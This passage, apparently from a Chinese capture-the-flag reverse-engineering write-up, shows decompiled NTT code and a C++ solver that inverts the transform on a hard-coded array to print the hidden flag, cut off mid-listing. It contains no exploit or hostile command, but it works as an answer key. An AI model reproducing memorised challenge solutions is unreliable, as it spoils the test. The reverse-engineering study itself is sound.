<span><span style="color: #D6DEEB">}</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #403F53">k </span><span style="color: #994CC3">=</span><span style="color: #403F53"> n;</span></span>
<span><span style="color: #994CC3">while</span><span style="color: #403F53"> (</span><span style="color: #AA0982">1</span><span style="color: #403F53"> </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> k)</span></span>
<span><span style="color: #403F53">{</span></span>
<span><span style="color: #403F53">    k </span><span style="color: #994CC3">=</span><span style="color: #403F53"> k </span><span style="color: #994CC3">/</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> n; i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> i </span><span style="color: #994CC3">+</span><span style="color: #403F53"> k </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    {</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (j </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; j </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> k; j </span><span style="color: #994CC3">=</span><span style="color: #403F53"> j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        {</span></span>
<span><span style="color: #403F53">            uVar3 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53">(undefined4 </span><span style="color: #994CC3">*</span><span style="color: #403F53">)(</span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">DAT_00505280 </span><span style="color: #994CC3">+</span><span style="color: #403F53"> (</span><span style="color: #994CC3">long</span><span style="color: #403F53">)(k </span><span style="color: #994CC3">+</span><span style="color: #403F53"> j) </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">            local_38 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53">(undefined4 </span><span style="color: #994CC3">*</span><span style="color: #403F53">)(a </span><span style="color: #994CC3">+</span><span style="color: #403F53"> (</span><span style="color: #994CC3">long</span><span style="color: #403F53">)(j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> i) </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">            local_34 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53">(undefined4 </span><span style="color: #994CC3">*</span><span style="color: #403F53">)(a </span><span style="color: #994CC3">+</span><span style="color: #403F53"> (</span><span style="color: #994CC3">long</span><span style="color: #403F53">)(k </span><span style="color: #994CC3">+</span><span style="color: #403F53"> i </span><span style="color: #994CC3">+</span><span style="color: #403F53"> j) </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">            iVar1 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> i;</span></span>
<span><span style="color: #403F53">            uVar2 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> mint::operator</span><span style="color: #994CC3">+</span><span style="color: #403F53">((mint </span><span style="color: #994CC3">*</span><span style="color: #403F53">)</span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">local_38, </span><span style="color: #4876D6">SUB41</span><span style="color: #403F53">(local_34, </span><span style="color: #AA0982">0</span><span style="color: #403F53">));</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">*</span><span style="color: #403F53">(undefined4 </span><span style="color: #994CC3">*</span><span style="color: #403F53">)((</span><span style="color: #994CC3">long</span><span style="color: #403F53">)iVar1 </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53"> </span><span style="color: #994CC3">+</span><span style="color: #403F53"> a) </span><span style="color: #994CC3">=</span><span style="color: #403F53"> uVar2;</span></span>
<span><span style="color: #403F53">            local_30 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> mint::operator</span><span style="color: #994CC3">-</span><span style="color: #403F53">((mint </span><span style="color: #994CC3">*</span><span style="color: #403F53">)</span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">local_38, </span><span style="color: #4876D6">SUB41</span><span style="color: #403F53">(local_34, </span><span style="color: #AA0982">0</span><span style="color: #403F53">));</span></span>
<span><span style="color: #403F53">            iVar1 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> k </span><span style="color: #994CC3">+</span><span style="color: #403F53"> i </span><span style="color: #994CC3">+</span><span style="color: #403F53"> j;</span></span>
<span><span style="color: #403F53">            uVar3 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> mint::operator</span><span style="color: #994CC3">*</span><span style="color: #403F53">((mint </span><span style="color: #994CC3">*</span><span style="color: #403F53">)</span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">local_30, </span><span style="color: #4876D6">SUB41</span><span style="color: #403F53">(uVar3, </span><span style="color: #AA0982">0</span><span style="color: #403F53">));</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">*</span><span style="color: #403F53">(undefined4 </span><span style="color: #994CC3">*</span><span style="color: #403F53">)((</span><span style="color: #994CC3">long</span><span style="color: #403F53">)iVar1 </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53"> </span><span style="color: #994CC3">+</span><span style="color: #403F53"> a) </span><span style="color: #994CC3">=</span><span style="color: #403F53"> uVar3;</span></span>
<span><span style="color: #403F53">        }</span></span>
<span><span style="color: #403F53">    }</span></span>
<span><span style="color: #403F53">}</span></span></code></pre></div></section>
<p><s>去洛谷上找到失散多年的多项式板子</s><span class="mojikumi-line-end">，</span>进行 NTT 逆变换即可<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="C++ 代码块" data-v-ad49d235>C++</h5><ile-root id="ile-30"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-30--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">#include</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&lt;</span><span style="color: #ECC48D">algorithm</span><span style="color: #D9F5DD">&gt;</span></span>
<span><span style="color: #C792EA">#include</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&lt;</span><span style="color: #ECC48D">iostream</span><span style="color: #D9F5DD">&gt;</span></span>
<span></span>
<span><span style="color: #C792EA">using</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">namespace</span><span style="color: #D6DEEB"> std;</span></span>
<span></span>
<span><span style="color: #C792EA">typedef</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">long</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">long</span><span style="color: #D6DEEB"> ll;</span></span>
<span></span>
<span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> mod </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">998244353</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> N </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">64</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> G </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">3</span><span style="color: #D6DEEB">;</span></span>
<span></span>
<span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> n, </span><span style="color: #C5E478">r</span><span style="color: #D6DEEB">[N];</span></span>
<span></span>
<span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">a</span><span style="color: #D6DEEB">[N] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> {</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00000fcc</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">00000104</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0749db91</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">343624e8</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0d13ca29</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">272a2071</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">36a7f6c3</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0c1a1e65</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">1f1ad239</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">01f3ec88</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">020a0b87</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">36c3abd1</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">05559031</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">34c4b3f4</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">12708155</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0c18c538</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2afc9af2</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">11eaefa9</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">088b5998</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2cc0fd8f</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">10370a24</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">09c6d2a3</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">29d08b05</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">04f4d794</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2c5f4e4e</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">3a038304</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2071b91e</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">1b445996</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">31373cf5</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">21e86de9</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">37bf21f8</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2f9134fb</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">21770505</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">027a31ad</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">1043be97</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0c84bff9</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2e286891</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">27a8054e</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">3886de12</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">20e03387</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">1bfe24ef</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">01839cf5</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2562af12</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">09009f44</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">284b4a3b</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2eaa70ec</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0859bba4</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">1507cc41</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">3b34c2e5</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2a5819f3</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2a1aa122</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">15c8a1b3</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2b94d4e7</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">3760071c</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2e63c3af</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">315e10bd</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0b54503c</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">06f4408e</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">09400d3e</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">38b88f00</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">336d0b03</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">164dcc04</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2edbbdf1</span><span style="color: #D6DEEB">, </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">0e53e235</span><span style="color: #D6DEEB">};</span></span>
<span></span>
<span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">qpow</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #D7DBE0">x</span><span style="color: #D6DEEB">, </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #D7DBE0">y</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">{</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> out </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">while</span><span style="color: #D6DEEB"> (y)</span></span>
<span><span style="color: #D6DEEB">    {</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (y </span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">            out </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (ll)out </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> x </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">        x </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (ll)x </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> x </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">        y </span><span style="color: #C792EA">&gt;&gt;=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">    }</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB"> out;</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span></span>
<span><span style="color: #C792EA">void</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">ntt</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D7DBE0">A</span><span style="color: #D6DEEB">, </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #D7DBE0">type</span><span style="color: #D6DEEB">, </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #D7DBE0">L</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">{</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> i, j, k, wn, w, t;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> L; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">i)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">r</span><span style="color: #D6DEEB">[i])</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #82AAFF">swap</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[i], </span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[</span><span style="color: #C5E478">r</span><span style="color: #D6DEEB">[i]]);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> L; i </span><span style="color: #C792EA">&lt;&lt;=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    {</span></span>
<span><span style="color: #D6DEEB">        wn </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">qpow</span><span style="color: #D6DEEB">(G, (mod </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">/</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">));</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (j </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; j </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> L; j </span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        {</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (k </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">, w </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">; k </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> i; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">k, w </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (ll)w </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> wn </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod)</span></span>
<span><span style="color: #D6DEEB">            {</span></span>
<span><span style="color: #D6DEEB">                t </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (ll)</span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[i </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> k] </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> w </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[i </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> k] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (</span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> k] </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> t </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> mod) </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> k] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (</span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> k] </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> t) </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">            }</span></span>
<span><span style="color: #D6DEEB">        }</span></span>
<span><span style="color: #D6DEEB">    }</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (type </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    {</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #82AAFF">reverse</span><span style="color: #D6DEEB">(A </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, A </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> L);</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> inv </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">qpow</span><span style="color: #D6DEEB">(L, mod </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> L; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">i)</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (ll)</span><span style="color: #C5E478">A</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> inv </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">    }</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span></span>
<span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">main</span><span style="color: #D6DEEB">()</span></span>
<span><span style="color: #D6DEEB">{</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">ntt</span><span style="color: #D6DEEB">(a, </span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, N);</span></span>
<span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> N; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">i)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #82AAFF">putchar</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">a</span><span style="color: #D6DEEB">[i]);</span></span>
<span><span style="color: #D6DEEB">}</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">#include</span><span style="color: #403F53"> </span><span style="color: #111111">&lt;</span><span style="color: #C96765">algorithm</span><span style="color: #111111">&gt;</span></span>
<span><span style="color: #994CC3">#include</span><span style="color: #403F53"> </span><span style="color: #111111">&lt;</span><span style="color: #C96765">iostream</span><span style="color: #111111">&gt;</span></span>
<span></span>
<span><span style="color: #994CC3">using</span><span style="color: #403F53"> </span><span style="color: #994CC3">namespace</span><span style="color: #403F53"> std;</span></span>
<span></span>
<span><span style="color: #994CC3">typedef</span><span style="color: #403F53"> </span><span style="color: #994CC3">long</span><span style="color: #403F53"> </span><span style="color: #994CC3">long</span><span style="color: #403F53"> ll;</span></span>
<span></span>
<span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> mod </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">998244353</span><span style="color: #403F53">;</span></span>
<span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> N </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">64</span><span style="color: #403F53">;</span></span>
<span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> G </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">3</span><span style="color: #403F53">;</span></span>
<span></span>
<span><span style="color: #994CC3">int</span><span style="color: #403F53"> n, </span><span style="color: #4876D6">r</span><span style="color: #403F53">[N];</span></span>
<span></span>
<span><span style="color: #994CC3">int</span><span style="color: #403F53"> </span><span style="color: #4876D6">a</span><span style="color: #403F53">[N] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> {</span></span>
